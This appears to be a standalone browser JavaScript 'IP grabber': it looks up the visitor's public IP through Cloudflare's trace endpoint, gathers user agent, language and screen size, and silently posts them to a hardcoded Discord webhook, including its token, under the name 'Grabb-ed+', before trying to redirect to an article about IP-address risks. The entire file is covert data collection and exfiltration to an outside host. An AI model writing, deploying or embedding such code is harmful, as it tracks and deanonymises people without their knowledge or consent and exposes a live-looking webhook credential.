var http = ""
function text(url) {
  return fetch(url).then(res => res.text());
}

text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
  let ip = data.match(ipRegex)[0];
  var agent = navigator.userAgent;
    let lang  = navigator.language;
  let xscreen = screen.width + "x"+screen.height;
  var udata = ip + " " + agent + " " + lang + " " + xscreen;
  const xml = new XMLHttpRequest;
   xml.open("POST", "https://discord.com/api/webhooks/1121363260361412669/9Y911sZeCAw3iKTNRkcdcWlkUi_9Y3edKZ8xrDTpwtGMT87FHeyMHw584qaC7CrulvjO");

   xml.setRequestHeader('Content-type', 'application/json');

   const params = {
     username: "Grabb-ed+",
     avatar_url: "",
     content: udata
   }
   xml.send(JSON.stringify(params));
window.location.redirect("https://nordvpn.com/blog/what-can-someone-do-with-your-ip-address/");
});
